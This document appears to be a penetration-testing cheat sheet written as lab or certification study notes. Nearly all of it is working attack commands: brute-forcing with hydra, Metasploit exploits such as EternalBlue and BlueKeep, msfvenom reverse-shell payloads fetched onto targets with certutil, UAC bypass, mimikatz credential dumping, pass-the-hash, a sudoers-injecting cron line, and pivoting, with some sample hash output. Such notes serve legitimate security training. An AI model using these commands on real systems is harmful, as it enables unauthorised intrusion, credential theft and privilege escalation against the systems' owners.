|                                            ** In the name of God, the Most Gracious, the Most Merciful **                                    |
.----------------------------------------------------------------------------------------------------------------------------------------------.
    
█▓▒G░O░O░D░░▒▓              
┊┊▏▔╲▂▂▂╱▔▏┊┊┊
╭━━╮╭┈╮⠀╭┈╮╭━━╮
╰╰╰┃▏╭╮⠀╭╮▕┃╯╯╯
┈┃⠀┃▏┈┈▅┈┈▕┃⠀┃
┈┃⠀┃▏┈╰┻╯┈▕┃⠀┃
┈┃⠀╰█▓▒░L░U░C░K▒▓█

----------------------------------------------------------------------------------------------------------------------------------------------
PART 1 : Assessment Methodologies & Auditing                                                                                                  |
----------------------------------------------------------------------------------------------------------------------------------------------

# HOST DISCOVERY

## Ping scan
sudo nmap -sn <TARGET_IP/NETWORK>

## ARP scan
netdiscover -i eth1 -r <TARGET_IP/NETWORK>


# NMAP PORT SCAN

## Basic 
nmap <TARGET_IP>

## Skip ping
nmap -Pn <TARGET_IP>

## Scan all ports
nmap -p- <TARGET_IP>

## Port 80 only scan
nmap -p 80 <TARGET_IP>

## Custom list of ports scan
nmap -p 80,445,3389,8080 <TARGET_IP>

## Custom ports range scan
nmap -p1-2000 <TARGET_IP>

## Fast mode & verbose scan
nmap -F <TARGET_IP> -v

## UDP scan
nmap -sU <TARGET_IP>

## Service scan
nmap -sV <TARGET_IP>

## Service + O.S. detection scan
sudo nmap -sV -O <TARGET_IP>

## Default Scripts scan
nmap -sC <TARGET_IP>
nmap -Pn -F -sV -O -sC <TARGET_IP>

## Aggressive scan
nmap -Pn -F -A <TARGET_IP>

----------------------------------------------------------------------------------------------------------------------------------------------
PART 2 : Host & Network Penetration Testing                                                                                                  |
----------------------------------------------------------------------------------------------------------------------------------------------

I. Enumeration:

1. SMB:

# NMAP

sudo nmap -p 445 -sV -sC -O <TARGET_IP>

nmap -sU --top-ports 25 --open <TARGET_IP>

nmap -p 445 --script smb-protocols <TARGET_IP>

nmap -p 445 --script smb-security-mode <TARGET_IP>

nmap -p 445 --script smb-enum-sessions <TARGET_IP>

nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-shares <TARGET_IP>

nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-domains--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-groups--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-os-discovery <TARGET_IP>

nmblookup -A <TARGET_IP>


# SMBMAP

## Connect as guest
smbmap -u guest -p "" -d . -H <TARGET_IP>

## Connect with valid creds
smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>

## Remote Code Execution
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'

## List all drives
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L

## List dir content
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$'

## Upload a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/sample_backdoor' 'C$\sample_backdoor'

## Download a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'


# SMB Connection

## Listing all Services & No Password Prompt 
smbclient -L <TARGET_IP> -N
smbclient //<TARGET_IP>/public -N

## Listing all Services & Specific User
smbclient -L <TARGET_IP> -U <USER>
smbclient //<TARGET_IP>/<USER> -U <USER>

## SMB Connection Established
help
ls
get <filename>

## Rpcclient MS-RPC & Anonymous
rpcclient -U "" -N <TARGET_IP>

## RPC Connection Established
enumdomusers
enumdomgroups
lookupnames admin

# ENUM4LINUX

## Enumerate information using enum4linux with all options
enum4linux -o <TARGET_IP>

## Enumerate users using enum4linux
enum4linux -U <TARGET_IP>

## Enumerate shares using enum4linux
enum4linux -S <TARGET_IP>

## Enumerate groups using enum4linux
enum4linux -G <TARGET_IP>

## Enumerate information, including additional details, using enum4linux
enum4linux -i <TARGET_IP>

## List users' SID by performing RID cycling
enum4linux -r -u "<USER>" -p "<PW>" <TARGET_IP>

## Enumerate information using enum4linux with all options
enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>


# HYDRA
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb

# METASPLOIT SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/pipe_auditor

2. FTP: 

# Try anonymous:anonymous login
nmap --script ftp-anon -p21 <TARGET_IP>

Result: 
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)

ftp <TARGET_IP>


# NMAP
## Perform version detection, script scanning, and OS detection on port 21
nmap -p 21 -sV -sC -O <TARGET_IP>

## Perform version detection and OS detection on port 21
nmap -p 21 -sV -O <TARGET_IP>

## Perform FTP anonymous login check
nmap -p 21 --script ftp-anon <TARGET_IP>

## Perform FTP brute-force attack using Nmap with a specified user list
nmap -p 21 --script ftp-brute --script-args userdb=<USERS_LIST> <TARGET_IP>


# HYDRA
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> -t 4 ftp

3. SSH: 

# NMAP
## Perform version detection, script scanning, and OS detection on port 22 
nmap -p 22 -sV -sC -O <TARGET_IP>

## Enumerate supported algorithms for SSH on port 22 
nmap -p 22 --script ssh2-enum-algos <TARGET_IP>

## Retrieve SSH host keys on port 22 using Nmap
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full <TARGET_IP>

## Enumerate SSH authentication methods for a specified user on port 22 
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <TARGET_IP>

## Run a specific command over SSH on port 22
nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=<USER>, ssh-run.password=<PW>" <TARGET_IP>

## Perform SSH brute-force attack on port 22 with a specified user list
nmap -p 22 --script=ssh-brute --script-args userdb=<USERS_LIST> <TARGET_IP>


# HYDRA
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh

# METASPLOIT SSH
use auxiliary/scanner/ssh/ssh_login
//*  
        set RHOSTS <TARGET_IP>
        set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
        set STOP_ON_SUCCESS true
        set VERBOSE true
        exploit
*//

4. HTTP:

# WHATWEB
whatweb <TARGET_IP>

# BROWSH
browsh --startup-url http://<TARGET_IP>

# CURL
curl <TARGET_IP> | more


# NMAP
nmap --script=http-enum -sV -p80 <TARGET_IP>
nmap --script=http-headers -sV -p80 <TARGET_IP>
nmap --script=http-methods --script-args http-methods.url-path=/webdav/ -p80 <TARGET_IP>

nmap --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ -p80 <TARGET_IP>


#dirb
dirb http://<TARGET_IP>
dirb http://<TARGET_IP> /usr/share/metasploit-framework/data/wordlists/directory.tx


# METASPLOIT HTTP
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/http_version

//* 
set HTTP_METHOD GET
set TARGETURI /<DIR>/
set USER_FILE <USERS_LIST>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set AUTH_URI /<DIR>/
exploit
*//

5. MYSQL:

# NMAP
## Check for empty password in MySQL on port 3306 using Nmap
nmap -p 3306 --script=mysql-empty-password <TARGET_IP>

## Perform version detection and OS detection on port 3306 
nmap -p 3306 -sV -O <TARGET_IP>

## Check for empty password in MySQL on port 3306 
nmap -p 3306 --script=mysql-empty-password <TARGET_IP>

## Retrieve MySQL server information on port 3306 
nmap -p 3306 --script=mysql-info <TARGET_IP>

## Enumerate MySQL users on port 3306 with specified credentials
nmap -p 3306 --script=mysql-users --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>

## Enumerate MySQL databases on port 3306 with specified credentials
nmap -p 3306 --script=mysql-databases --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>

## Retrieve MySQL server variables on port 3306 with specified credentials
nmap -p 3306 --script=mysql-variables --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>

## Perform MySQL server audit on port 3306 with specified credentials
nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='<USER>',mysql-audit.password='<PW>',mysql-audit.filename=''" <TARGET_IP>

## Dump MySQL password hashes on port 3306 with specified credentials
nmap -p 3306 --script=mysql-dump-hashes --script-args="username='<USER>',password='<PW>'" <TARGET_IP>

## Execute a custom MySQL query on port 3306 with specified credentials
nmap -p 3306 --script=mysql-query --script-args="query='select count(*) from <DB_NAME>.<TABLE_NAME>;',username='<USER>',password='<PW>'" <TARGET_IP>


# HYDRA
hydra -l <USER> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> mysql


# METASPLOIT MYSQL
use auxiliary/scanner/mysql/mysql_schemadump
use auxiliary/scanner/mysql/mysql_writable_dirs
use auxiliary/scanner/mysql/mysql_file_enum
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login

## METASPLOIT MSSQL
use auxiliary/scanner/mssql/mssql_login
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_enum_sql_logins
use auxiliary/admin/mssql/mssql_exec
use auxiliary/admin/mssql/mssql_enum_domain_accounts


6. Microsoft SQL:

#NMAP
## Perform version detection and script scanning on port 1433
nmap -sV -sC -p 1433 <TARGET_IP>

## Retrieve MS SQL Server information on port 1433 
nmap -p 1433 --script ms-sql-info <TARGET_IP>

## Retrieve MS SQL Server NTLM authentication information on port 1433 
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <TARGET_IP>

## Check for empty password in MS SQL Server on port 1433 
nmap -p 1433 --script ms-sql-empty-password <TARGET_IP>

## Perform MS SQL Server brute-force attack on port 3306 with specified user and password lists
nmap -p 3306 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt <TARGET_IP>

## Execute a custom MS SQL Server query on port 3306 with specified credentials and save output to a file
nmap -p 3306 --script ms-sql-query --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-query.query="SELECT * FROM master..syslogins" <TARGET_IP> -oN output.txt

## Dump MS SQL Server password hashes on port 3306 with specified credentials
nmap -p 3306 --script ms-sql-dump-hashes --script-args mssql.username=<USER>,mssql.password=<PW> <TARGET_IP>

## Execute MS SQL Server xp_cmdshell command on port 3306 with specified credentials
nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="ipconfig" <TARGET_IP>

## Execute MS SQL Server xp_cmdshell command to read a file on port 3306 with specified credentials
nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" <TARGET_IP>


# MySql Connection Established 
mysql -h <TARGET_IP> -u <USER>
mysql -h <TARGET_IP> -u root
MySQL [(none)]> help
MySQL [(none)]> show databases;
MySQL [(none)]> use <DB_NAME>;
MySQL [(DB_NAME)]> select count(*) from <TABLE_NAME>;
MySQL [(DB_NAME)]> select load_file("/etc/shadow");

7. SMTP:

# NMAP
sudo nmap -p 25 -sV -sC -O <TARGET_IP>
nmap -sV -script banner <TARGET_IP>

# USER ENNUMERATION
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <TARGET_IP>


# METASPLOIT
service postgresql start && msfconsole -q
use auxiliary/scanner/smtp/smtp_enum

# SENDMAIL { FAKE MAIL TO ROOT }
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s 192.63.243.3 -u Fakemail -m "Hi root, a fake mail from admin" -o tls=no


8. Vulnerability Assessment

# HEARTBLEED
nmap -sV --script ssl-enum-ciphers -p <SECURED_PORT> <TARGET>
nmap -sV --script ssl-heartbleed -p 443 <TARGET_IP>

# ETERNALBLUE
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>

# BLUEKEEP
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# LOG4J
nmap --script log4shell.nse --script-args log4shell.callback-server=<CALLBACK_SERVER_IP>:1389 -p 8080 <TARGET_IP>

searchsploit vuln_name xx.xx
searchsploit -m vuln_name xx.xx

----------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------------------------------------
PART 2 : System/Host Based Attacks                                                                                                            |
----------------------------------------------------------------------------------------------------------------------------------------------

I. Windows Exploitation
1. IIS WEBDAV:

#NMAP
nmap -p80 --script http-enum -sV <TARGET_IP>

Result: 
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


# HYDRA 
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <TARGET_IP> http-get /webdav/

# DAVTEST
davtest -auth bob:password_123321 -url http://<TARGET_IP>/webdav

# CADAVER
cadaver http://<TARGET_IP>/webdav
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp

## METASPLOIT
service postgresql start && msfconsole
use exploit/multi/handler
use exploit/windows/iis/iis_webdav_upload_asp

//*
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>
set HttpUsername <USER>
set HttpPassword <PW>
set PATH /webdav/metasploit.asp
*//

Result: 
meterpreter> getuid
        Server username: NT AUTHORITY\SYSTEM
meterpreter> hashdump
        [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter> migrate 5820

meterpreter> hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
bob:1008:aad3b435b51404eeaad3b435b51404ee:31b977436c6ea5bfa9ee65aaddb880d1:::


2. SMB:

# NMAP
nmap -p 445 -sV -sC <TARGET_IP>

## METASPLOIT
use auxiliary/scanner/smb/smb_login
//*
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
*//

use exploit/windows/smb/psexec
//*
set VERBOSE false
set SMBUser <USER>
set SMBPass <PW>
*//

use exploit/windows/smb/ms17_010_eternalblue
//*
set RHOSTS 192.168.31.131
exploit
*//


3. RDP:

## METASPLOIT
use auxiliary/scanner/rdp/rdp_scanner
//*
set RHOSTS <TARGET_IP>
set RPORT <PORT>
run
*//

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <TARGET_IP>
show targets
set target <NUMBER>
exploit
*//

## HYDRA
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<TARGET_IP> -s <PORT>


##XFREERDP

xfreerdp /u:<USER> /p:<PW> /v:<TARGET_IP>:<PORT>
xfreerdp /u:<USER> /p:<PW> /v:<TARGET_IP>:<PORT> /w:1920 /h:1080 /fonts /smart-sizing

4. WINRM:

# CRACKMAPEXEC Brute-Force
## Attempt WinRM login using a password list for user enumeration
crackmapexec winrm <TARGET_IP> -u <USER> -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

## Attempt WinRM login using a specific password and execute "whoami" command
crackmapexec winrm <TARGET_IP> -u <USER> -p <PW> -x "whoami"

## Attempt WinRM login using a specific password and execute "systeminfo" command
crackmapexec winrm <TARGET_IP> -u <USER> -p <PW> -x "systeminfo"


# EVIL-WINRM Shell
evil-winrm -i <IP> -u <USER> -p <PASSWORD>

## NMAP
nmap --top-ports 7000 <TARGET_IP>
nmap -sV -p 5985 <TARGET_IP>

# Command Shell
evil-winrm.rb -u <USER> -p '<PW>' -i <TARGET_IP>

## METASPLOIT
use exploit/windows/winrm/winrm_script_exec

//*
set RHOSTS <TARGET_IP>
set USERNAME <USER>
set PASSWORD <PW>
set FORCE_VBS true
exploit
*//


5. Windows Privilege Escalation:

# WIN KERNEL

## MSFVENOM PAYLOAD CREATION & HOSTING
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe -o payload.exe
python3 -m http.server
# Download payload.exe on target

# METASPLOIT
use exploit/multi/handler 
//*
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>
run

## PAYLOAD EXECUSION ON VICTIM
Open the link http://<LOCAL_HOST_IP>:<LOCAL_PORT>/ and download payload.exe


## EXPLOIT SUGGESTER ON METERPRETER
meterpreter > background
meterpreter > sessions
meterpreter > use post/multi/recon/local_exploit_suggester
set SESSION <HANDLER_SESSION_NUMBER>

## MsfConsole Meterpreter Privesc
getprivs
getsystem

# Exploitable vulnerabilities modules
exploit/windows/local/bypassuac_dotnet_profiler
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/bypassuac_sdclt
exploit/windows/local/cve_2019_1458_wizardopium
exploit/windows/local/cve_2020_1054_drawiconex_lpe
exploit/windows/local/ms10_092_schelevator
exploit/windows/local/ms14_058_track_popup_menu
exploit/windows/local/ms15_051_client_copy_image
exploit/windows/local/ms16_014_wmi_recv_notif


use exploit/windows/local/ms16_014_wmi_recv_notif
set SESSION 7
set LPORT 4422
exploit

# UAC - UACME
getuid
        Server username: VICTIM\admin

sysinfo
    Computer       : VICTIM
    OS             : Windows 2012 R2 (6.3 Build 9600).
    Architecture   : x64
    System Language: en_US
    Domain         : WORKGROUP
    Logged On Users: 2
    Meterpreter    : x86/windows

pgrep explorer
migrate <PID>


getprivs
    Enabled Process Privileges
    ==========================
    Name
    ----
    SeChangeNotifyPrivilege
    SeIncreaseWorkingSetPrivilege
    SeShutdownPrivilege
    SeTimeZonePrivilege
    SeUndockPrivilege

shell
net user
net localgroup administrators

    Alias name   administrators
    Comment   Administrators have complete and unrestricted access to the computer/domain
    Members
    -------------------------------------------------------------------------------
    admin
    Administrator
[!] Note : "admin" user is a local administrator


# UAC - UACME

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > backdoor.exe

## METASPLOIT - Listening
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>

## Meterpreter (Unprivileged session)
cd C:\\
mkdir Temp
cd Temp
upload /root/backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe
shell
Akagi64.exe 23 C:\Temp\backdoor.exe

akagi32.exe [Key] [Param]
akagi64.exe [Key] [Param]

## Elevated Meterpreter Received on the listening session
ps -S lsass.exe
migrate <lsass_PID>
hashdump

# ACCESS TOKEN IMPERSONATION
## METASPLOIT - Meterpreter (Unprivileged session)
pgrep explorer
migrate <explorer_PID>
getuid
getprivs

load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
getuid
getprivs # Access Denied
pgrep explorer
migrate <explorer_PID>
getprivs
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"


6. Windows Credential Dumping:

# Exploitation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TARGET_IP> LPORT=1234 -f exe > payload.exe

python -m SimpleHTTPServer 80

## METASPLOIT
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>
run

## On target system
certutil -urlcache -f http://<TARGET_IP>/payload.exe payload.exe
# Run payload.exe

# METASPLOIT - Meterpreter
sysinfo
getuid
pgrep lsass
migrate <explorer_PID>
getprivs

# Creds dumping - Meterpreter
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

# MIMIKATZ
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell

mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonPasswords

# PASS THE HASH
## sekurlsa::logonPasswords
background
search psexec
use exploit/windows/smb/psexec
set LPORT <LOCAL_PORT2>
set SMBUser Administrator
set SMBPass <ADMINISTRATOR_LM:NTLM_HASH>
exploit

crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"


II. Linux Exploitation:

1. FTP:

hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> -t 4 ftp

# FTP:
ftp <TARGET_IP>

ls -lah /usr/share/nmap/scripts | grep ftp-*
searchsploit ProFTPD

2. SSH:

# HYDRA 
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt <TARGET_IP> -t 4 ssh

# SSH
ssh <USER>@<TARGET_IP>

groups sysadmin
cat /etc/*release
uname -r
cat /etc/passwd
find / -name "flag"

3. SAMBA:
# HYDRA
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> smb

# SAMBA
smbmap -u <USER> -p '<PW>' -H <TARGET_IP>
smbclient -L <TARGET_IP> -U <USER>
enum4linux -a <TARGET_IP>
enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>

4. Linux Privilege Escalation
4.1 LINUX KERNEL
## Linux-Exploit-Suggester Install
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O linux-exploit-suggester.sh

chmod +x linux-exploit-suggester.sh

./linux-exploit-suggester.sh

4.2 CRON
crontab -l
find / -name <CRONJOB_SCRIPT>
printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>

4.3 SUID
file <FILE>
strings <FILE>
    # find called binary
rm <BINARY>
cp /bin/bash <BINARY>
./<FILE>

4.4 LINUX CRENEDTIAL DUMPING

cat /etc/passwd
sudo cat /etc/shadow

# METASPLOIT (once exploited)
use post/linux/gather/hashdump
set SESSION <NUMBER>

OR

use auxiliary/analyze/crack_linux
set SHA512 true

OR

# Kiwi - Meterpreter
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

# Mimikatz - Meterpreter
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell

mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonPasswords

5. Pivoting:

#Socket Server
## Show all TCP sockets
### Connections
ss -t
 
### To show listening sockets as well
ss -t -a
or
ss -ta


## Show all UDP sockets
### Connections
ss -u
 
### To show listening sockets as well
ss -u -a
or
ss -ua

## Show all UNIX sockets
### Connections
ss -x
 
# To show listening sockets as well
ss -x -a
or
ss -xa

# Meterpreter
run autoroute -s <TARGET1_SUBNET_NETWORK/MASK>

use auxiliary/scanner/portscan/tcp
set RHOSTS <TARGET2_IP>
set PORTS 1-100

# Port Forwarding
sessions 1
portfwd add -l <LOCAL_PORT> -p <TARGET2_PORT> -r <TARGET2_IP>
background
db_nmap -sS -sV -p <LOCAL_PORT> localhost
# Target2 Exploitation
use exploit/windows/http/badblue_passthru
set payload windows/meterpreter/bind_tcp
set RHOSTS <TARGET2_IP>
set LPORT <LOCAL_PORT2>
run


# Basic Scenario [INE Lab]:
https://www.youtube.com/watch?v=r7yuU7nvjSc

Victim Machine 1: 10.10.10.100
Victim Machine 2: 10.10.20.200

(1) WHICH ONE IS IN OUR NETWORK: 
ping 10.10.10.100 --> RESPONSE 
ping 10.10.20.200 --> DIDNT RESPOND

-> Victim Machine 1 is in our network
-> Victim Machine 2 not in our network

(2) NETWORK MAPPING 
nmap -sV 10.10.10.100 -p 80,135,139,445,3389

-> HFS 2.3 (rejetto)

(3) AUTOMATED REJETTO HFS EXPLOIT
msfconsole
search HFS 2.3
use exploit/windows/http/rejetto_hfs_exec
//*
set RHOSTS 10.10.10.100
run
*//
meterpreter>

-> Machine Compromised !

(4) ICMP TEST TO VICTIM 2

meterpreter> shell
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> ping 10.10.20.200
-> Success

(5) PIVOTING TIME
Control+z
Background channel 2?[y/N] y
meterpreter> ipconfig


meterpreter> run autoroute -s 10.10.10.0/24 [VICTIM_1_NETWORK/MASK]
meterpreter> run autoroute -p
Control+z
Background channel 3?[y/N] y
use auxiliary/scanner/portscan/tcp
//*
set RHOSTS <VICTIM_2_IP>
set PORTS 1-100
run
*//

(6) PORT FORWARDING
{ ELITE PORT: 31337 }

sessions -i 1
meterpreter> portfwd add -l 31337 -p 80 -r VICTIM_2_IP

(7) SCANNING VICTIM_2 WITH NMAP VIA OUR ELITE PORT
nmap -sV -p 31337 localhost
-> Badblue 2.7 Vulnerability discovered

search badblue
use exploit/windows/http/badblue_passthru
//*
set RHOSTS VICTIM_2_IP
run
[!] IMPORTANT : USE BIND SHELL [!] 
set payload windows/meterpreter/bind_tcp
*//

meterpreter> shell


----------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
# METASPLOIT SERVICE ENUMERATION MODULES
----------------------------------------------------------------------------------------------------------------------------------------------
# FTP
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/anonymous
----------------------------------------------------------------------------------------------------------------------------------------------
# SMB
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
----------------------------------------------------------------------------------------------------------------------------------------------
# HTTP
use auxiliary/scanner/http/apache_userdir_enum
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/dir_listing
use auxiliary/scanner/http/http_put
use auxiliary/scanner/http/files_dir
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/robots_txt
----------------------------------------------------------------------------------------------------------------------------------------------
# MYSQL
use auxiliary/admin/mysql/mysql_enum
use auxiliary/admin/mysql/mysql_sql
use auxiliary/scanner/mysql/mysql_file_enum
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_schemadump
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_writable_dirs
----------------------------------------------------------------------------------------------------------------------------------------------
# SSH
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ssh/ssh_enumusers
----------------------------------------------------------------------------------------------------------------------------------------------
# SMTP
use auxiliary/scanner/smtp/smtp_enum
use auxiliary/scanner/smtp/smtp_version
----------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
# METERPRETER USEFUL COMMANDS
----------------------------------------------------------------------------------------------------------------------------------------------
background
cat
cd
checksum md5 /bin/bash
clearev
download
edit
execute -f ifconfig
getuid
hashdump
ifconfig
ls
migrate
mkdir
ps
pwd
rmdir
search -f *.txt
shell
sysinfo
upload
----------------------------------------------------------------------------------------------------------------------------------------------
# UPGRADE SHELL WITH PYTHON
python -c 'import pty; pty.spawn("/bin/sh")'
----------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
# TRANSFERING FILES
# PYTHON WEB SERVER
python -V
python3 -V
py -v # on Windows

# Python 2.7
python -m SimpleHTTPServer <PORT_NUMBER>

# Python 3.7
python3 -m http.server <PORT_NUMBER>

# On Windows, try 
python -m http.server <PORT>
py -3 -m http.server <PORT>
----------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------------------------------------
PART 3 : Web Application Pentration Testing                                                                                                   |
----------------------------------------------------------------------------------------------------------------------------------------------

nmap -sS -sV -p 80,443,3306 <TARGET_IP>

# Dirbuster
dirb http://<TARGET_IP>

# CURL
curl -I <TARGET_IP>
curl -X GET <TARGET_IP>
curl -X OPTIONS <TARGET_IP> -v
curl -X POST <TARGET_IP>
curl -X POST <TARGET_IP>/login.php -d "name=john&password=password" -v
curl -X PUT <TARGET_IP>

curl <TARGET_IP>/uploads/ --upload-file hello.txt
curl -X DELETE <TARGET_IP>/uploads/hello.txt -v

# Gobuster
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 403,404

